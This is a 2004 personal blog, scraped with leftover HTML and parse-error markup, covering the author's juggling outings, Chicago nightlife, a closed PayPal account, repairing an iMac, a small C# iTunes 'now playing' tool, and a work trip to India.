such. wait wait. oh I did. I hung out with tahmour and we just played around a bit. then matiss came home and <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A06%3A20_tahmours_visit&img=IMG_0590.jpg'>we juggled</a>. we then went and got some food at lula and then I ran off to have dinner with cliff and his friend for his <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A06%3A19_cliffs_engagment'>engagment party</a>. it was hilarious. his friends are all very funny. after that - I came home and watched Hiroyuki Morita&#8217;s <a href='http://www.nausicaa.net/miyazaki/neko/'>the cat returns</a>. it was very good. I love how cute and fun that guy makes ALL animals. heh. the fat cat ruled. and then tai came over cuz she was sad and drunk. so after debugging that - I went to bed. crazy girls. hahah. yea yea yea. <br /><br />then on sunday - I got up early (~11) and went to meet tahmour at her friend nates house. we juggled a bit and just hung out - eventually making it to the oak street beach. the oak street beach is a <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A06%3A20_tahmours_visit&img=IMG_0606.jpg'>weird little cement platform</a> where <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A06%3A20_tahmours_visit&img=IMG_0609.jpg'>rollerbladers and jugglers</a> meet on sundays. so we <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A06%3A20_tahmours_visit&img=IMG_0607.jpg'>juggled</a> there until around 3 - when I went to wicker park for my friend gregs bday celebration. that was when the trouble started. it was a nice day. all <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A06%3A20_gregs_bday&img=IMG_0616.jpg'>my friends were around</a> and there was a seemingly endless <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A06%3A20_gregs_bday&img=IMG_0620.jpg'>supply of drinks</a> ;) it was a lot of fun. I need to wear <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A06%3A20_gregs_bday&img=IMG_0642.jpg'>sunglasses</a> more often. heh. so yea. after embibing a bit more than usual on a sunday - we went to see dodgeball. it was &#8220;ok&#8221; - a lot of relaly good cameos. and a lot of relaly funny oneliners. <br /><br />ok I am late for a meeting. <br /><br />ok back. no idea whats going on. the whole meeting I just thought about what I was going to talk about. and now I am lost. confused. etc. I need to buy my tickets for all sorts of things. I hate money and the lack of it.</p>

                <p>so this day has been weird already and it is barely 9:30. first last night I got home from juggling club and was notified that my paypal account was terminated due to 3gscreensaver having porn on it. I actually don&#8217;t know if that was the reason they just sent me a terse email with <a href='http://www.paypal.com/cgi-bin/webscr?cmd=p/gen/ua/use/index_frame-outside&ed=mature'>this</a> link. so I am assuming - unless they think <a href='http://www.savechrisfromprison.com'>save chris</a> or <a href='http://www.weownthesun.com'>we own the sun</a> is &#8220;mature&#8221; - it has to be <a href='http://www.3gscreensaver.com'>3gscreensaver</a>. what is screwed up is that it is a user contributed system, so I didn&#8217;t put the porn there. so I was tricked. but also it is messed up cuz the site was almost 2 years old. haha. so they have ignored it for two years. awesome. so now I am pretty much SOL for a lot of my commerce stuff. it sucks quite a bit. I guess I have to open a new paypal account and hope they don&#8217;t cancel it. but my other paypal account had a rating of almost 600 - and had been open since the days of X.com. sad. anyway. I hate them. I may have lost the $150 that was in the account as well. it is sad. I will porbably try calling but I doesn&#8217;t seem like it is any use. <br /><br />on a much happier note I played a MEAN game of tetris today on the train. I started at level 9 and made it to level 15. I beat my personal high score of 100,000. rule. especially since it was in the 25 minute train ride I have. I didn&#8217;t screw up once. I gotta play more. more more more. <br /><br />i solved all my programming problems today in the shower. it ruled. hopefully it will work. nobody knows ;) <br /><br />tonight is skinny puppy. I am pretty excited. <br /><br />so I was chilling - reading my blog reader and I see the headline &#8221;<a href='http://www.edithfrost.com/index.php/weblog/harpers_so_funny/'>Harper's so funny</a>&#8221; over at <a href='http://www.edithfrost.com/'>edith's</a> page. hehe. I was like. woah. I win. haha. she was linking to <a href='http://www.dopeman.org/dylanhoody/'>dylans hoody page</a>. which I would like to point out is incomplete - cuz my punk little brother isn&#8217;t cooperating and taking the much lauded action shots. someday. SOMEDAY. I tell you. <br /><br />ok I am going to listen to death metal and do work.</p>

                <p>so the past month - I have reengaged my ears in a black metal journey. it is awesome. I <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;3 black metal. I have been listening to primarily dimmu borgir, cradle of filth and emperor. however - I have delved into a bit of bathory and my old favorite therion. it all rules so so much. my current favorites are dimmu borgir&apos;s new album &quot;death cult armageddon&quot; and cradle of filth&apos;s &quot;from cradle ot enslave.&quot;  so so  good. I will probably end up worshiping the devil and killing my roommates - only to get sick from drinking their blood. the sickness will cause me to be hospitalized and then the &quot;authorities&quot; will find the remains of my roomates and I will get into trouble. but - that is the risk I am willing to take - cuz this music RULES. haha. umm.. yea.. &lt;br/&gt;</pre><br />so I found a REALLY REALLY good document about taking apart and iMac. now I just have to find the power supply part. hehe. check out <a href='http://www.appletalk.com.au/forums/index.php?showtopic=718'>this site</a> for a similar doc. <br /><br />yesterday beck&#8217;s friend tamour hooked up with us and <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1087163325-Nokia6600(904).jpg'>we juggled</a>. it was pretty fun. then we hung out. matiss and I played quake - while listening to black metal of course - and then tamour called and we got dinner. I then went to my pseudo date and then met tamour at smartbar - where we didn&#8217;t get in. so I went home. and went to bed. it ruled. I need to sleep a bit more. <br /><br />skinny puppy is soon. I am excited.<br /><br />if you press ctrl-h in aim it will put a hr tag. basically. hehe. weird.</p>

                <p>so yesterday at work we <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1086977484-Nokia6600(895).jpg'>watched the movie</a> startup.com. it was pretty good. a quite sad story really. it made me want to be involved in a startup again. haha. I say agan like I was involved in one during the .com wars. I am a liar. I wasn&#8217;t. in fact I don&#8217;t even have arms. <br /><br />after the movie I secured myself an <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1086986287-Nokia6600(898).jpg'>imac</a> that is totally broken. haha. somehow it got friend. and when they plugged it in at work - it broke about 10 power strips and a couple of comptuers. doh. so I gotta fix it. I have a feeling that if I replace the power supply it will fix everything. haha. hopefully. I don&#8217;t want to blow everything else up. by everything else - I mean the tv. so anyway. I got it. and I carried it <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1087008844-Nokia6600(899).jpg'>home</a>. I rule. it was hilarious to carry it on the train during rush hour. so today I <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1087093976-Nokia6600(901).jpg'>took the imac apart</a> to figure out what the deal was. and I wore it as a <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1087094678-Nokia6600(903).jpg'>hat</a>.<br /><br />yesterday I wore one of my <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1086978962-Nokia6600(896).jpg'>"crazy" shirts</a> from india. it makes me look <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1086986198-Nokia6600(897).jpg'>crazy</a>.<br /><br />last night I went to lava lounge with a bunch of friends. and evertually<em>as always) made it to crobar. and then smartbar. my cell phone camera does not <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1087026914-Nokia6600(900).jpg'>work well in crobar</a>. however my little midget camera does <a href='http://nata2.info/?path=pictures/events/2004:06:11_lava_crobar'>work better</a>.</em></p>

                <p>last night hiromi and I went to go see the movie called <a href='http://www.supersizeme.com/'>supersize me</a>. It was made by some guy named <a href='http://www.supersizeme.com/home.aspx?page=aboutdirector'>Morgan</a> <a href='http://imdb.com/name/nm1041597/'>Spurlock</a>. he ate mcdonalds everyday for one month. it totally destroyed him. heh. he was broken. it scared me. are country is so broken. we are going down the drain. sad day. <br /><br />rachel gave me <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1086842973-Nokia6600(889).jpg'>a bike</a>. it rules. I am pretty happy with it. it seems to be a nice bike - other than the weird candy cane paint job. I think I am gunna paint it black and make the sides say dumb things. that will be cool. of course. haha. I need to tune it up. I can&#8217;t decide what to do first. I shoudl probably paint it first and tune it up second. haha. umm. yea. I keep dreamign about popping wheelies and doing tricks. haha. I am lame. and by lame I mean incredible. <br /><br />i broke down yesterday and purchased another copy of Anna Karenina. I gave up on attempting to find my old copy. mostly cuz I really want to just finish it. what this really means - is that matt and katie will bring me my copy tonight. haha. apparently oprah has <a href='&apos;Anna Karenina&apos; '>decided to promote</a> the translation I am reading. I really don&#8217;t know how I feel about that. I guess it is good. but I feel like a dork carrying an oprah book around on the train, whereas before I felt like a badass. so yea. I guess I gotta finish it and move on to some light reading: gravity&#8217;s rainbow. hehe. <br /><br />RULE<br /><br /><a href='http://www.attackmorgan.com/gallery'>here</a> are some pictures that morgan is posting</p>

                <p>so I got a gmail account. it is pretty dope. a completely different way to use email. it is kinda crazy. I don&#8217;t like that you cannot import your old mail. and that you don&#8217;t have folders. but the tagging and such really revolutionizes email. it is pretty nuts. I want to give invites to some friends though. so I guess I am gunna have to wait. stupid google and its fancy way of doing things. <br /><br />i wish it could act as a client/mta for nata2. that would rule. if yall want. send me an email at natatwo at gmail dot com.<br /><br /> k word. <br /><br />chris really liked <a href='http://helpchrisholmes.org'>his site</a>. it is pretty funny. all he did is laugh. haha. it ruled. I will attempt to mp3 his message. it was basically just him laughing and calling me a madman. RULE.</p>

                <p>This weekend was pretty nice. I just hung out. watched movies. went to a bbq on saturday at my friend <a href='http://www.colepierce.com'>cole's</a> house. it was fun. met some cool cats. after the bbq I went with <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A06%3A05_crobar_random&img=IMG_0552.jpg'>elaine</a> to <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A06%3A05_crobar_random'>crobar</a>. (of course. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A06%3A05_crobar_random&img=IMG_0554.jpg'>jordan</a> met us and we hung out with <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A06%3A05_crobar_random&img=IMG_0561.jpg'>red hair matt</a> - who seems to scare everyone who seems that picture. hah. it was fun. <br /><br />i also posted pictures from <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A31_memorial_day'>memorial day</a> and a random <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A29_sushi_wabi'>sushi wabi</a> visit with hiromi and her friend. Hiromi now works at sushi wabi. which is cool. but with her working - I spend a lot more time alone. sad. <br /><br />the last couple days I have worn some of the clothes I got from india. today it is this <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1086625145-Nokia6600(870).jpg'>nice "work" shirt</a> that is apparently &#8220;not my style.&#8221; and then yesterday I was wearing a shirt that I modified to appear as &#8220;straight&#8221; as possible. it totally <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1086562006-Nokia6600%28868%29.jpg'>worked</a>. (i removed the sleeves and the collar - I rule).<br /><br />i am now suppose to cold call this girl and ask her out. I am scared. I hate pressure like this. but whatever. I shoudl do it. what do I have to lose. maybe my arms and legs - when trip while on the phone on to the path of <a href='http://www.maggots.org/images/bus.jpg'>that bus</a>. <br /><br />i have drastically rearranged my <a href='http://nata2.info/?path=pictures%2Fevents'>pictures</a>.

                <p>i worked. and then I went and got my hair trimmed. haha. I mean shorn. after that I came home and PASSED out. it ruled. slept until about 9 or 10. ordered some food. watched &#8216;bend it like beckham&#8217; and then watched &#8216;platonic sex.&#8217; both were quite good. &#8216;bend it like beckham&#8217; was really funny - I really liked it. sorta dumb - but really nice. &#8216;platonic sex&#8217; was quite good - incredibly weird. a very strange movie. and relaly sad. but it was good. it is about a japanese AV star - and her very very hard life. it was done sorta non linearly - so at times I was confused. but it was overall quite good. ok. now is time to sleep until late tomorrow. <br /><br />w00t</p>

I sent it to all my friends. haha. morgan was like &#8220;TELL HIM I MOVED OR DIED.&#8221; hehe. rule. <br /><br />hiromi works now. as does matt and matiss. so once again I have from 6 until around 10 to hang out with myself. which is awesome. I get SOOOO bored. heh. so I usually sleep. now I remember how I started taking naps. I guess I need to gather some friends - even though I apparently have some - I can&#8217;t seem to find any from 6-9. <br /><br />ok I guess I should goto bed. work is sucking lately. it was awesome. then suckage. stupid people who are not in aggrement with me. haha. well whatever. I will fight the &#8220;good&#8221; battle and probably lose. but its cool. <br /><br />i will post a surprise later tomorrow night. it will rule. you will smile.</p>

                <p>hehe. this weekend was an incredible experiment in what I can take - mostly in regards to sleep deprevation - but also in regards to alcohol poisoning. which is really something I am not exactly proud of - but it was a lot of fun. so it all started on thrusday. me and some friends went to a smartbar party - and then to crobar. I had to try out my new &#8220;drop my name and you can get into crobar for free&#8221; trick (seriously - on thursdays just say your there to see harper reed - it should work). the tricked worked. and crobar was pretty dope. most of my friends make fun of me about it. but seriously. it is fun sometimes. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;3. haha. &lt;br/&gt;</pre>so anyway. after crobar I of course went to bed. and ROCKED work the next day. we had a couple relaly important meetings and I ruled them. basically we had to make all of these HUGE changes and they are crazy and confusing. I also worked on my secret work project - which also rules. it is using c# to make some fancy XML conversion stuff. it is only a secret because I don&#8217;t talk about it to anyone. it isn&#8217;t like a real secret - which is too bad. I wish it was. I love secrets. so after work on friday - hilary and myself went to hard rock and had a beer. then we went to innjoy and saw a friend of mines art opening. it was pretty good. we got there really early so we just hung out and ate some food. after that we went to our homes and napped.</p>

I rule. basically it is a utility that uses itunes to grab the currently playing song and post it to your blog/app or whatever. it is pretty nifty and I have been using various versions for the last couple days. the final(ish) version is pretty dope and allows you to do things like this: <blockquote><small>
[Listening to: Religion - Front 242]
</small></blockquote> hehe. rule. anyway. to do this I had to learn c# which turned out to be awesome and quite easy. I loved it. I want to write a bunch more applications. maybe a nice app to interface with the ambient orbs and such. <br /><br />word.</p>

                <p>recently apple released a pretty good COM sdk for its <a href='http://itunes.com'>itunes</a> program. my friend <a href='http://blog.andrewcarlson.org/'>ajc</a> created some <a href='http://blog.andrewcarlson.org/archive/2004/05/18/239.aspx'>sample code</a> that would post whatever song you are listening to currently to a webpage. I found this pretty cool. and quite handy. so I implement my own version and BAM. if you notice at the bottom of my page (below the del.ico.us links) I have a listing of the most recent 5 songs I have listened to. <br /><br />the next step is to create a flash app to display the songs for myspace. that should rule. <br /><br />then create an actual application rather than a console app. something that sits in the taskbar icons and chills out. maybe with some slick config - and some other tricks. it could be really cool. <br />w00t. nice work andy. <br /><br />really all this is going to do is show everyone that I only listen to like ten artists. haha. umm. yea. ;)<br /><br />btw. this was my first foray into c# and it is pretty dope. I really like it and will probably spend some more time checking it out. heh. stupid programming. always filling my brain with thoughts.</p>

I am fascinated with how thorough Tolstoy covers the story. and how the story seemingly covers everything. it is soo good. I love the feeling of want that is associated with reading a good book.. right now I feel that the only thing that could satisfy my want is to go home and read that book - or write a web app to do fancy things with itunes. heh. hmm. I will probably read. but only because I am tired. but I have a really good idea. I should do it. <br /><br />last night hiromi and I watched <a href='http://www.imdb.com/title/tt0230591/'>one day in september</a>. it is about the palestinian terrorist organization black september&#8217;s attack on the isreali 1972 olympic team. it was quite a good documentary. afterwards, while thinking about the movie - I thought of some things that I have been struggling with for the past couple weeks. first: why do we allow terrorism to work? and how do we react to disallow terrorism to effect us? and second: if I was so pushed, would I participate in a terror movement. <br /><br />to address the first consideration - it seems to me that terrorism wouldn&#8217;t work if we didn&#8217;t give into the fear. if we didn&#8217;t give into the mob ideals of retribution and what not. in reagards to september 11th - what if we would have rebuilt the WTC bigger and better and not gone to war? I keep wondering how things would be different if we would have looked to the historics of isreal, the general middle east or N. Ireland for our reaction - rather than just blanketly attacked terrorism. after watching the &#8220;one day in sept.&#8221; movie and seeing how the german government was not prepared for such a security violation - which in turn created a situation that allowed the terrorists to actually &#8220;win&#8221; and get their message out. what would have been a better way for the germans to react? should they have stormed in and just destroyed the terrorists with the potential for killing the hostages? I have no idea. <br /><br />now the second thought is scarier. I guess I thought about this - cuz the palestinian guy was explaining how he had lived in refugee camps and all this horrible stuff and the terror organizations gave him hope and food. I thought &#8220;what if that was me&#8221; and it was somethign I believed in. like what if some larger country attempted to occupy the US - would I be a freedom fighter and attempt to destroy the moral of the enemy through terror and fear? I guess I probably would. but it is all so foreign to me. I mean. I think I woudl attempt to protect the U.S. however I could. &#8220;protect freedom&#8221; but I don&#8217;t think I could join the army and BLINDLY fight for truth. it woudl have to be more guerrilla. I think that scares me. I have no idea what I am talking about. I feel as though I am writing sentences with out regard for the previous sentence. <br /><br />cat power is sad<br /><br />so I updated some of my <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india'>india pictures</a>. particularly - I added some from when <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0395.jpg'>suresh</a>, <a href='http://nata2.info/.thumbnails/pictures/events/2004%3A05%3A13_india/bangalore/IMG_0399.jpg'>myself</a> and some of his friends went to cosmo village. I also added some pictures of what was in my <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0406.jpg'>back</a> <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0407.jpg'>yard</a>. it ruled. here <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0412.jpg'>i am</a>. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0420.jpg'>this</a> cart had HUGE wheels. it cracked me up. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0444.jpg'>here</a> is a picture of JP, the driver. he rules so much. somewhere I found <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0459.jpg'>this</a> poster which is about &#8220;india&#8217;s first all girl rock band.&#8221; heh. wtf. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0460.jpg'>here</a> is one of the last pictures I took in india. it is vinay, his family, guru and myself. after we ate at this really crazy nice afghan place. I felt dirty - being american there. haha. whatever<br /><br />i need to go home. it is almost 5:30. I have been here since 8:30. wtf. need. to. go. home.</p>

&lt;Br&gt;&lt;Br&gt;the churches were pretty cool. they are all very majestic and quite something. it was as I expected - a mix of indian and western stylings. vinay&apos;s favorite was the best one. it was where he got married and was the most colorful. a lot of jesus. &lt;br /&gt;&lt;br /&gt;today at work there is a lot of games and such. it is pretty cool to see.&lt;br /&gt;&lt;br /&gt;more blog later prolly. &lt;Br&gt;&lt;br /&gt;i think I am going ot go clubbing again tonight. an dthen look at temples and such tomorrow.

                <p>last night my friends and I went to this pretty nice resturant and had excellent food and free beer. the night was advertised as &#8220;unlimited intoxication&#8221; - which seemeingly is a misnomer. what does misnomer mean? so we hung out there and I had excellent tandori chicken kabobs and lotsa fish. it all ruled oh so much. good good food. then suresh and I went to a club called spin. apparently there is only about 50 things globally that you are allowed to call a club. and spin is obviously one of them. so we went to spin and hung out with some of suresh&#8217;s friends. they were very nice. it was nice to talk to none software young people - who were progressive(by progressive I mean interested in moving forward - not necessarily interested in becoming western(which way is forward - I have no idea)). they were almost all professionals - one was an architect and one was a student. the other one worked for an NGO which dealt with education reform of the slum children. hah. but yea. it was neat to talk to them. it was also very comfortable to be in a club. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;3 clubs. I am lame. &lt;br/&gt;</pre><br />so then I came home and uplaoded my pictures to my computer and then slept. I was able to sleep in a little which was nice. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;one funny thing that happened is my driver came and picked me up at 9:15 yesterday - however my guest house guy thought the driver was supposed to pick me up at 8:30. so the driver is now getting into trouble. hah. I had to clear it up. also. just now a man came with a coke on a platter. for me. rule. &lt;3 coke. ;) &lt;br/&gt;&lt;br /&gt;the club last night played pretty good music. it was for the most part old, but some of it was nice. a lot of house(of course) and a lot of indianish house stuff. which ruled. I am hopefully going to be picking up some music this weekend. I want some rock and some dance stuff - and then a couple of the bollywood remix cds. hah. &lt;br /&gt;&lt;br /&gt;rule. hey yall. thanks for all the messages.  ;) and I am starting to ignore the smell of mothballs which pervades my room in the guesthouse. &lt;br /&gt;&lt;br /&gt;hopefully I will be posting pictures soon. I will link to them here. </pre></p>

I am pretty sure that <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&amp;img=IMG_0109.jpg'>this</a> is the guest house. the marble work was <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&amp;img=IMG_0117.jpg'>insane</a>. seriously. you have no idea. apparently <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&amp;img=IMG_0124.jpg'>this</a> is a famous place to take a picture. <br /><br />after we saw the taj we went to the <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&amp;img=IMG_0131.jpg'>red fort</a>. it was also pretty <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&img=IMG_0135.jpg'>crazy and intricate</a>. from here you can see the <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&img=IMG_0147.jpg'>taj pretty good</a>. apparently the guy that made the taj was banished to the red fort and was made to look on to his creation until he died. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&img=IMG_0145.jpg'>this is his fountain</a> and <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&img=IMG_0146.jpg'>this is his bedroom</a>. it was a nice bedroom. the work in the red stone is very intricate. it is also <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&img=IMG_0157.jpg'>insane</a>. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&img=IMG_0162.jpg'>here</a> is one of my guides and i. <br /><br />on the way back from agra to delhi I noticed a trend that I had never seen before. apaprently they buy the <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&img=IMG_0175.jpg'>chassis</a> of the <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&img=IMG_0176.jpg'>truck separate</a> from the truck and take it to another place to add the body. I think that <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&img=IMG_0179.jpg'>this</a> is a mosque. <br /><br />in delhi I saw <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&img=IMG_0222.jpg'>this</a> amazing Bah?&#8217;? Temple. it was so <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&img=IMG_0223.jpg'>spectacular</a> at night. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&img=IMG_0227.jpg'>here</a> is one of the auto-rickshaws that are everywhere. and as per usual I had to <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fdelhi_agra&img=IMG_0236.jpg'>get on the plane</a> while it was parked on the tarmack. this has happened in frankfurt, delhi and bangalore. hehe. it is pretty awesome though. <br /><br />so I flew to bangalore - which is an incredible city. as I flew in I could tell that it was a nice climate and that I would like it. since the elections are in full swing, they have &lt;A href=&#8221;http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&amp;img=IMG_0239.jpg&#8221;&gt;election signs&lt;/a&gt; up all over. also a lot of <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0241.jpg'>technology signs</a> and a lot of <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0242.jpg'>construction</a>. all the construction apparently ends up looking like <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0256.jpg'>this</a> but starts out looking like <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0257.jpg'>this</a>. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0258.jpg'>here </a> is the unicorn house. and of course the <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0283.jpg'>nike  factory store</a>. there are a ton of <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0282.jpg'>brightly painted trucks</a> everywhere. some of the <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0298.jpg'>advertisments</a> really crack me up. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0307.jpg'>this </a> is apparently a free hospital. it looks pretty cool and is only about 5 years old. <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0310.jpg'>this</a> is itpl where I have been working for the past couple days. on the first night my friends took me to MG road which has <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0311.jpg'>bunches of stores and such</a>. I took <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0345.jpg'>this picture</a> for my more askew friends. the guest house where I stayed is <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=STE_0316.jpg'>really nice</a>. it has a <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0346.jpg'>pool</a>. my friends <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0349.jpg'>guru and siddu</a> took me around a bunch - as has <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0355.jpg'>suresh</a>. suresh took me to a <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0354.jpg'>club</a> where I hung out with some of his <a href='http://nata2.info/?path=pictures%2Fevents%2F2004%3A05%3A13_india%2Fbangalore&img=IMG_0353.jpg'>friends</a>.<br /><br />so that is it so far. I plan to get a bunch more pictures in the next couple days of chruchs, temples and my friends. hoepfully I will see some good stuff. like I said before. I practice the <a href='http://www.lomography.com/content/about/rules/'>rules</a> of <a href='http://www.lomography.com/'>lomography</a> (even though I am digital) so some of the pictures may be lame ;). but whatever.</p>

                <p>so today lunch ;) we went to a nice place called the green park. it was fun. the whole team came - which was nice. I like hanging out with them. they are all so nice and it is (of course) nice to finally put faces to all the people I have worked with over the last couple years. <br /><br />so now I am uploading the pictures. I am afraid it is going to take forever. the tata connection is very slow. I will add more when they are done.</p>

                <p>yesterday and last nigth was pretty fun. guru, siddu and myself all went around bangalore again. this time we hung out in a very popular and modern area with lots of shops. I went to this great little shop that had some nice sandlewood and such. it was all very nice but really expensive. so I lost money in that gamble. and probably yall gained some gifts ;). I then purchased a swatch watch(mainly cuz I have NO idea what time it is and when I landed I was confused for days) and I got some bangels for my lady friends (if they are not mean like some (heh)). I then was stricken with feelings of both extreme hunger and extreme fatigue(stupid airplanes and dates) and was totally confused - so we went to this really &#8220;western&#8221; place and had excellent food. <br /><br />i am almost completely amazed at the &#8220;british&#8221; influence that is still apparent here. at the resturant everyone was interested in engaging in this weird servitude version of waiting tables. all very polite, traditional and very formal. it weirded me out. mostly cuz I get nervous in those situations. but the british influence is everyehere - and as guru said &#8220;we have had only 50 years to get over it.&#8221; so I guess it follows. <br /><pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;i have slowed down on the picture taking. I don&apos;t want to take too many pictures of &quot;the natives&quot; cuz that seems pretty rude - even though I am way more interested in capturing the lives my friends lead than I am interested in capturing some temple. also.. we saw some temples yesterday. they are awesome. like nothing else I have seen. they are like a mix of graceland, vegas and a chruch. it is all very pretty. I was able to surprise everyone with my ability to name the hindu gods (go kinnera) and hoepfully will be visiting some temples and christian chruches tomorrow. &lt;Br&gt;&lt;br /&gt;the weather is just like california. &lt;br /&gt;&lt;br /&gt;i got kinda homesick last night. mostly cuz I was soo tired and felt really weak. I wanted to just talk to one of my friends. this situation reminds me of how social I am. how I strive for social contact and interaction. I get plenty here. but I am so led around - I don&apos;t feel in control. and you know how I like control. hehe. stupid airplanes. but yea. &lt;br /&gt;&lt;br /&gt;i yoyoed a bunch today. garnered some stares. heh. &quot;surprise&quot;&lt;br /&gt;&lt;br /&gt;now I am going to go and do work. or something. oh and meetings here are awesome. everyone formally suggests a change and then all hell breaks loose and everyone yells. then everyone thinks and it repeats. it is like meetings with the dev people at work (so I guess it makes sense) so yea. it is awesome. &lt;br /&gt;&lt;br /&gt;oh. and it is VERY interesting to see the al queda reacting to our horrible mess of abuse. wtf. I mean. one american publicly killed versus the 20 or so iraqis killed. hmm. weird. it doesn&apos;t make it right. but we shoudl once again look at WHY we are gettign attacked and not just blindly seek retribution (which I know we will(stupid bush)). it was interesting to see this in the newspaper this morning. it had such a small portion. heh. rule. nobody is surprised 